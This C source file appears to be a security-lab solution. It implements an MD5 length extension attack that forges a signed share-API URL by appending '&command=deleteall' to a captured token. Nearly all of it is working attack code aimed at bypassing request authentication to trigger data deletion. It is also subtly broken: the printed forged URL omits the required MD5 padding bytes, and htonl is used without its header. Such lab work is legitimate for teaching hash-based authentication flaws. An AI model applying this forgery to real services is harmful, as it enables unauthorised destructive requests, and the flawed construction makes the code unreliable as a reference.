#include <stdio.h>
#include <openssl/md5.h>

//http:/mtm.myphoto.com/share/api?token=08d2e52ec0c3118e07a61f01a1f9c181& data
//MD5(client’s 6-character password || data)
//&command=deleteall

int main(int argc, const char *argv[]) {

	unsigned char buffer[MD5_DIGEST_LENGTH];
	MD5_CTX c;

	MD5_Init(&c);


	/* You should implement your length attack here */
       
        // set the state of the desired state, using the token of the URL provided 
        MD5_Update(&c, "0000000000000000000000000000000000000000000000000000000000000000", 64);
        c.A = htonl(0x08d2e52e);
        c.B = htonl(0xc0c3118e);
        c.C = htonl(0x07a61f01);
        c.D = htonl(0xa1f9c181);

        // update the token by adding an additional command
        MD5_Update(&c, "&command=deleteall", 18);

        // print url with the new token
        printf("http:/mtm.myphoto.com/share/api?token=");
	/* Print the hash */
	MD5_Final(buffer, &c);
	for (int i = 0; i < 16; i++) {
		printf("%02x", buffer[i]);
	}
        printf("&data&command=deleteall");
	printf("\n");
	return 0;
}
